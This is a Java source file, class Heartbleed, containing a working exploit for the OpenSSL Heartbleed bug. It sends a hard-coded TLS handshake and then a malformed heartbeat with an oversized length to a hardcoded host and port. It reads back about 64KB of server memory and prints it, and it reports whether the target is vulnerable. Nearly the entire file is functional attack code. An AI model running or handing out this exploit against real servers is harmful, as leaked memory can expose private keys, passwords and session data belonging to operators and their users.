package com.asiainfo.dacp.dp.agent;
 
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
 
public class Heartbleed {
    private static byte[] hello = { (byte) 0x16, (byte) 0x03, (byte) 0x02,
            (byte) 0x00, (byte) 0xdc, (byte) 0x01, (byte) 0x00, (byte) 0x00,
            (byte) 0xd8, (byte) 0x03, (byte) 0x02, (byte) 0x53, (byte) 0x43,
            (byte) 0x5b, (byte) 0x90, (byte) 0x9d, (byte) 0x9b, (byte) 0x72,
            (byte) 0x0b, (byte) 0xbc, (byte) 0x0c, (byte) 0xbc, (byte) 0x2b,
            (byte) 0x92, (byte) 0xa8, (byte) 0x48, (byte) 0x97, (byte) 0xcf,
            (byte) 0xbd, (byte) 0x39, (byte) 0x04, (byte) 0xcc, (byte) 0x16,
            (byte) 0x0a, (byte) 0x85, (byte) 0x03, (byte) 0x90, (byte) 0x9f,
            (byte) 0x77, (byte) 0x04, (byte) 0x33, (byte) 0xd4, (byte) 0xde,
            (byte) 0x00, (byte) 0x00, (byte) 0x66, (byte) 0xc0, (byte) 0x14,
            (byte) 0xc0, (byte) 0x0a, (byte) 0xc0, (byte) 0x22, (byte) 0xc0,
            (byte) 0x21, (byte) 0x00, (byte) 0x39, (byte) 0x00, (byte) 0x38,
            (byte) 0x00, (byte) 0x88, (byte) 0x00, (byte) 0x87, (byte) 0xc0,
            (byte) 0x0f, (byte) 0xc0, (byte) 0x05, (byte) 0x00, (byte) 0x35,
            (byte) 0x00, (byte) 0x84, (byte) 0xc0, (byte) 0x12, (byte) 0xc0,
            (byte) 0x08, (byte) 0xc0, (byte) 0x1c, (byte) 0xc0, (byte) 0x1b,
            (byte) 0x00, (byte) 0x16, (byte) 0x00, (byte) 0x13, (byte) 0xc0,
            (byte) 0x0d, (byte) 0xc0, (byte) 0x03, (byte) 0x00, (byte) 0x0a,
            (byte) 0xc0, (byte) 0x13, (byte) 0xc0, (byte) 0x09, (byte) 0xc0,
            (byte) 0x1f, (byte) 0xc0, (byte) 0x1e, (byte) 0x00, (byte) 0x33,
            (byte) 0x00, (byte) 0x32, (byte) 0x00, (byte) 0x9a, (byte) 0x00,
            (byte) 0x99, (byte) 0x00, (byte) 0x45, (byte) 0x00, (byte) 0x44,
            (byte) 0xc0, (byte) 0x0e, (byte) 0xc0, (byte) 0x04, (byte) 0x00,
            (byte) 0x2f, (byte) 0x00, (byte) 0x96, (byte) 0x00, (byte) 0x41,
            (byte) 0xc0, (byte) 0x11, (byte) 0xc0, (byte) 0x07, (byte) 0xc0,
            (byte) 0x0c, (byte) 0xc0, (byte) 0x02, (byte) 0x00, (byte) 0x05,
            (byte) 0x00, (byte) 0x04, (byte) 0x00, (byte) 0x15, (byte) 0x00,
            (byte) 0x12, (byte) 0x00, (byte) 0x09, (byte) 0x00, (byte) 0x14,
            (byte) 0x00, (byte) 0x11, (byte) 0x00, (byte) 0x08, (byte) 0x00,
            (byte) 0x06, (byte) 0x00, (byte) 0x03, (byte) 0x00, (byte) 0xff,
            (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x49, (byte) 0x00,
            (byte) 0x0b, (byte) 0x00, (byte) 0x04, (byte) 0x03, (byte) 0x00,
            (byte) 0x01, (byte) 0x02, (byte) 0x00, (byte) 0x0a, (byte) 0x00,
            (byte) 0x34, (byte) 0x00, (byte) 0x32, (byte) 0x00, (byte) 0x0e,
            (byte) 0x00, (byte) 0x0d, (byte) 0x00, (byte) 0x19, (byte) 0x00,
            (byte) 0x0b, (byte) 0x00, (byte) 0x0c, (byte) 0x00, (byte) 0x18,
            (byte) 0x00, (byte) 0x09, (byte) 0x00, (byte) 0x0a, (byte) 0x00,
            (byte) 0x16, (byte) 0x00, (byte) 0x17, (byte) 0x00, (byte) 0x08,
            (byte) 0x00, (byte) 0x06, (byte) 0x00, (byte) 0x07, (byte) 0x00,
            (byte) 0x14, (byte) 0x00, (byte) 0x15, (byte) 0x00, (byte) 0x04,
            (byte) 0x00, (byte) 0x05, (byte) 0x00, (byte) 0x12, (byte) 0x00,
            (byte) 0x13, (byte) 0x00, (byte) 0x01, (byte) 0x00, (byte) 0x02,
            (byte) 0x00, (byte) 0x03, (byte) 0x00, (byte) 0x0f, (byte) 0x00,
            (byte) 0x10, (byte) 0x00, (byte) 0x11, (byte) 0x00, (byte) 0x23,
            (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x0f, (byte) 0x00,
            (byte) 0x01, (byte) 0x01 };
    private static byte[] bleed = { (byte) 0x18, (byte) 0x03, (byte) 0x02,
            (byte) 0x00, (byte) 0x03, (byte) 0x01, (byte) 0xff, (byte) 0xff };
    private static byte[] tmp;
    private static byte[] pay;
 
    /**
     * SSL3_RT_CHANGE_CIPHER_SPEC 20 
     * SSL3_RT_ALERT 21 
     * SSL3_RT_HANDSHAKE 22
     * SSL3_RT_APPLICATION_DATA 23 
     * TLS1_RT_HEARTBEAT 24
     * 
     * @param args
     * @throws Exception
     */
 
    public static void main(String[] args) {
    	System.out.println(attack("10.10.10.2", 5672));
        System.exit(0);
    }
 
    public static boolean attack(String host, int port) {
 
        System.out.println("开始连接...");
        Socket socket = null;
        try {
            socket = new Socket(host, port);
        } catch (UnknownHostException e) {
            System.out.println("未知主机.");
            return false;
        } catch (IOException e) {
            System.out.println("访问主机失败.");
            return false;
        }
        OutputStream out = null;
        try {
            out = socket.getOutputStream();
        } catch (IOException e) {
            System.out.println("获取输出流失败.");
            return false;
        }
        InputStream in = null;
        try {
            in = socket.getInputStream();
        } catch (IOException e) {
            System.out.println("获取输入流失败.");
            return false;
        }
 
        System.out.println("发送客户端心跳包...");
 
        try {
            out.write(hello);
        } catch (IOException e) {
            System.out.println("发送心跳包失败.");
            return false;
        }
 
        System.out.println("等待服务器心跳包...");
 
        while (true) {
            tmp = getData(in, 5);
            if (tmp[0] == 0) {
                System.out.println("服务器没有返回心跳包并且关闭了连接.");
                return false;
            }
 
            analyseHead(tmp);
 
            int len = (int) MyByte.HexString2Long(MyByte
                    .byteToHexString(tmp[3]) + MyByte.byteToHexString(tmp[4]));
 
            pay = getData(in, len);
 
            if (tmp[0] == 22 && pay[0] == 0x0E) {
                System.out.println("查找到返回正常的心跳包。");
                break;
            }
 
        }
 
        System.out.println("发送heartbeat心跳包...");
 
        try {
            out.write(bleed);
        } catch (IOException e) {
            System.out.println("发送heartbeat心跳包失败.");
            return false;
        }
        try {
            out.write(bleed);
        } catch (IOException e) {
            System.out.println("发送heartbeat心跳包失败.");
            return false;
        }
 
        while (true) {
            tmp = getData(in, 5);
            int len = (int) MyByte.HexString2Long(MyByte
                    .byteToHexString(tmp[3]) + MyByte.byteToHexString(tmp[4]));
 
            if (tmp[0] == 0) {
                System.out.println("没有heartbeat返回接收到, 服务器看起来不是易受攻击的");
                return false;
            }
 
            if (tmp[0] == 24) {
                System.out.println("接收到heartbeat返回:");
 
                int count=0;//长度计数
                for (int i = 0; i < 4; i++) {//读4次，全部读出64KB
                    pay = getData(in, len);
                    count+=pay.length;
                    System.out.print(hexdump(pay));
                }
 
                System.out.println("\n数据长度为:" + count);
 
                if (len > 3) {
                    System.out
                            .println("警告: 服务器返回了原本比它多的数据 -服务器是易受攻击的!");
                } else {
                    System.out
                            .println("服务器返回畸形的heartbeat, 没有返回其他额外的数据");
                }
 
                break;
 
            }
 
            if (tmp[0] == 21) {
                System.out.println("接收到警告:");
                System.out.println(hexdump(pay));
                System.out.println("服务器返回错误,看起来不是易受攻击的");
                break;
            }
 
        }
 
        try {
            out.close();
            in.close();
        } catch (IOException e) {
            System.out.println("关闭输入输出流异常");
        }
 
        return true;
    }
 
    public static byte[] getData(InputStream in, int lenth) {
        byte[] t = new byte[lenth];
        try {
            in.read(t);
        } catch (IOException e) {
            System.out.println("接受数据错误");
        }
        return t;
    }
 
    public static String hexdump(byte[] pay) {
        String s = "";
        try {
            s = new String(pay, "GB2312");
        } catch (UnsupportedEncodingException e) {
            System.out.println("未知编码");
        }
        return s;
    }
 
    public static void analyseHead(byte[] tmp) {
        System.out.print("接收到消息: ");
        System.out.print("类型:" + tmp[0] + "\t");
        System.out.print("版本:" + MyByte.byteToHexString(tmp[1])
                + MyByte.byteToHexString(tmp[2]) + "\t");
        System.out.println("长度:"
                + MyByte.HexString2Long(MyByte.byteToHexString(tmp[3])
                        + MyByte.byteToHexString(tmp[4])));
 
    }
 
}